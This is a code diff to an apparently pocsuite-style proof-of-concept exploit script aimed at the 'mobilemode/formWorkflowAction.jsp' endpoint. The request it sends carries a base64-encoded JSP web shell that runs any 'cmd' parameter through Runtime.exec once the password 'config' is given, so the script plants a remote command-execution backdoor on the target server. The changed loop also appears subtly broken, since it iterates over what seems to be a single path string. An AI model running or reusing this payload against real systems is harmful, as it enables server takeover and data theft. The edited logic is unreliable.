@@ -21,12 +21,8 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, './'):
                     url = path +"mobilemode/formWorkflowAction.jsp"
                     data = 'action=createWorkflow&fieldname_photo=data%3Aimage%2Fjsp%3Bbase64%2CPCUKICAgIGlmKCJjb25maWciLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsKICAgICAgICBieXRlW10gYiA9IG5ldyBieXRlWzIwNDhdOwogICAgICAgIG91dC5wcmludCgiPHByZT4iKTsKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsKICAgICAgICB9CiAgICAgICAgb3V0LnByaW50KCI8L3ByZT4iKTsKICAgIH0KJT4%3D&type_photo=photo&workflowid=zzz&workflowtitle=zzz&datasource=xxx&tablename=xxx'
 
